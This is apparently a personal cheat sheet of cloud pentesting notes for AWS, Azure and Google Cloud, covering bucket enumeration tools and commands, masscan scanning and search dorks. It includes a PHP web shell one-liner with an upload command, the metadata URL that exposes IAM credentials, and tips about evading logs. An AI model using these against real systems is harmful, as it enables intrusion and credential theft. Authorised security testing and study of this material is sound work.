# Cloud Pentesting    
Main Cloud platforms: Amazon Web Services, Microsoft Azure, Google Cloud. Most cloud providers have miminal logging by default.        
[Grey Hat Warfare](https://buckets.grayhatwarfare.com/): search public buckets       
Use masscan to scan a large IP range:      

    $ masscan 10.10.0.1/24 -p 22,25,80,443,3389            
    --rate 50000   #fastest scan    
    #Most devices won't log half open SYN scans (nmap -sS and masscan) or TLS scan to web ports              
## AWS     
AWS GuardDuty for security. No logging or versioning on by default.         
[AWS IP ranges](https://ip-ranges.amazon.aws/ip-ranges.json)         
[Pacu](https://github.com/RhinoSecurityLabs/pacu): AWS exploit framework      
[bucketfinder](https://github.com/FishermansEnemy/bucket_finder/tree/master): look for interesting files on Amazon S3 buckets.       
Access     
     
     CLI: using AWS access key and AWS secret key. Set as enviromental variables.     
     Web: management web portal access.      
Pen Testing on a web server:     

     check for web requests to s3 buckets at https://s3.amazonaws.com/{bucketname} or https://s3-{region}.amazonaws.com/{Org}         
     Config issues:   

Commands         

    https://aws.amazon.com/cli/   #AWS CLI    
   
    aws configure     #set up, can put temp in all values   
    aws s3 ls s3://bucket.site.com    #list contents of a bucket    
    aws sl ls s3://bucket --region      
    aws --endpoint=http://site.com s3 ls s3://site.com   #list objects and common prefixes    
    aws s3api get-bucket-acl --bucket bucket       
    aws s3 cp file.txt s3://bucket --profile user_profile    
  
might be able to upload a php web shell      

    echo '<?php system($_GET["cmd"]); ?>' > shell.php   #make web shell file   
    aws --endpoint=http://s3.site.com s3 cp shell.php s3://site.com     #upload web shell     

Search for files with keywords in buckets using [bucket_finder](https://github.com/FishermansEnemy/bucket_finder):     

    bucket_finder.rb search_term --download         
Instance Metadata     

    "Metadata" endpoint: 169.254.169.254. Vulns might allow remote attacks to access it.         
    http://169.254.169.254/latest/meta-data/iam/security-credentials/     #IAM creds     
AWS Lambda: can have vulns and be used to steal AWS keys via command injection.            
Denonia cryptominer malware targeted Lambda.     
### Resources      
https://www.hackthebox.com/blog/aws-pentesting-guide    
https://cloud.hacktricks.xyz/pentesting-cloud/aws-security     
    
## Azure    
Built in security with Azure Sentinel. Azure acts as a middleman between the AD network and user sign on - makes lots of traditional AD acts ineffective.         
Azure Blob: https://{account}.blob.core.windows.net/{container}     


### Enumerate Azure Blobs   
[Azure-CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli)     
[AZ-Blob-Attacker](https://github.com/VitthalS/Az-Blob-Attacker)    
[Basic Blob Finder](https://github.com/joswr1ght/basicblobfinder): search for Azure blobs       
[Microburst](https://github.com/NetSPI/MicroBurst): Scripts for pentesting Azure    

    basicblobfinder.py wordlist   #enum buckets       
Google Hacks:     

    site:*.blob.core.windows.net
    site:"blob.core.windows.net" and intext:"CONFIDENTIAL"
### Resources:    
https://www.inversecos.com/2022/01/how-to-detect-and-compromise-azure.html      

## Google Cloud   
GCP Cloud Armor for security. [List of Buckets by IPS](https://www.gstatic.com/ipranges/cloud.json)           
GCP: https://www.googleapis.com/storage/v1/b/{bucketname}      
[GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute): search for Google Storage Buckets and check accesses.     
Bucket permissions: listable (enum and read files), writeable (upload)       

    gcpbucketbrute.py -u -k search_org      
    gsutil ls gs://bucket       #list contents of a public bucket     
